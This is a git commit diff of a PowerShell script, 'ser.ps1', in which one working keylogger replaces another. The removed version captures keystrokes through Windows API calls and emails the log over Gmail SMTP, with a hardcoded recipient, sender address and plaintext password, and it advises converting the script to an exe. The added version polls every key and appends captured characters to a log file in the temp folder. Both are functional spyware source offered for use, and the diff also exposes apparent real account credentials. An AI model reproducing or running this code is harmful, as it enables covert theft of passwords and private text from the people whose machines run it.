5b4bc7feebb29886475b4e362bc295fba16df8f0
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-09-01 15:27:55 -0500

    Update ser.ps1

--- ser.ps1
+++ ser.ps1
@@ -1,90 +1,112 @@
-######################################################################
-## after you modify the information below then convert it to exe file#
-######################################################################
+<#
+PowerShell keystroke logger by shima
+http://vacmf.org/2013/01/23/powershell-keylogger/
+#>
 
-function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
-{
-  # Signatures for API Calls
-  $signatures = @'
+
+
+function KeyLog {
+	
+	# MapVirtualKeyMapTypes
+	# <summary>
+	# uCode is a virtual-key code and is translated into a scan code.
+	# If it is a virtual-key code that does not distinguish between left- and
+	# right-hand keys, the left-hand scan code is returned.
+	# If there is no translation, the function returns 0.
+	# </summary>
+	$MAPVK_VK_TO_VSC = 0x00
+	
+	# <summary>
+	# uCode is a scan code and is translated into a virtual-key code that
+	# does not distinguish between left- and right-hand keys. If there is no
+	# translation, the function returns 0.
+	# </summary>
+	$MAPVK_VSC_TO_VK = 0x01
+	
+	# <summary>
+	# uCode is a virtual-key code and is translated into an unshifted
+	# character value in the low-order word of the return value. Dead keys (diacritics)
+	# are indicated by setting the top bit of the return value. If there is no
+	# translation, the function returns 0.
+	# </summary>
+	$MAPVK_VK_TO_CHAR = 0x02
+	
+	# <summary>
+	# Windows NT/2000/XP: uCode is a scan code and is translated into a
+	# virtual-key code that distinguishes between left- and right-hand keys. If
+	# there is no translation, the function returns 0.
+	# </summary>
+	$MAPVK_VSC_TO_VK_EX = 0x03
+	
+	# <summary>
+	# Not currently documented
+	# </summary>
+	$MAPVK_VK_TO_VSC_EX = 0x04
+	
+	$virtualkc_sig = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
+'@
+
+	$kbstate_sig = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int GetKeyboardState(byte[] keystate);
+'@
+
+	$mapchar_sig = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MapVirtualKey(uint uCode, int uMapType);
+'@
+
+	$tounicode_sig = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-  # load signatures and make members available
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-    
-  # create output file
-  $null = New-Item -Path $Path -ItemType File -Force
+	$getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
+	$getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
+	$getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
+	$getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
 
-  try
-  {
-    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
+	while ($true) {
+		Start-Sleep -Milliseconds 40
+		$gotit = ""
+		
+		for ($char = 1; $char -le 254; $char++) {
+			$vkey = $char
+			$gotit = $getKeyState::GetAsyncKeyState($vkey)
+			
+			if ($gotit -eq -32767) {
+			
+				$l_shift = $getKeyState::GetAsyncKeyState(160)
+				$r_shift = $getKeyState::GetAsyncKeyState(161)
+				$caps_lock = [console]::CapsLock
+				
+				$scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
+				
+				$kbstate = New-Object Byte[] 256
+				$checkkbstate = $getKBState::GetKeyboardState($kbstate)
+				
+				$mychar = New-Object -TypeName "System.Text.StringBuilder";
+				$unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
+				
+				if ($unicode_res -gt 0) {
+					$logfile = "$env:temp\key.log"
+					Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
+				}
+			}
+		}
 
-   #please specify time and default is 20 seconds
-    $time = 0
-    while($time -lt 1200) {
+$Prompt = Read-Host "detener ? [Y/N]"
 
-    $time
-    $time++
-      Start-Sleep -Milliseconds 2
-      
-      # scan all ASCII codes above 8
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get current key state
-        $state = $API::GetAsyncKeyState($ascii)
+Switch ($Prompt) {
 
-        # is key pressed?
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
+Y { exit }
+N { 'No' }
 
-          # translate scan code to real code
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
-
-          # get keyboard state for virtual keys
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
-
-          # prepare a StringBuilder to receive input key
-          $mychar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
-          if ($success) 
-          {
-            # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-          }
-        }
-      }
-    }
-  }
-  finally
-  {
-    # please specify your email info
-
-    $data = Get-Content "$Path" 
-    $emailto = 'canarerobertjohn@gmail.com'
-    $email = 'wisincsales@gmail.com'
-    $SMTPServer = 'smtp.gmail.com'
-    $SMTPPort = '587'
-    $Password = 'robertjohn'
-    $subject = 'here is the keys'	
-    $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
-    $smtp.EnableSSL = $true
-    $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $Password);
-    $smtp.Send($email, $emailto, $subject, $data);
-    
-    
-  }
 }
 
-# records all key presses until script is aborted by pressing CTRL+C
-# will then open the file with collected key codes
-Start-KeyLogger
+	}
+}
+
+KeyLog
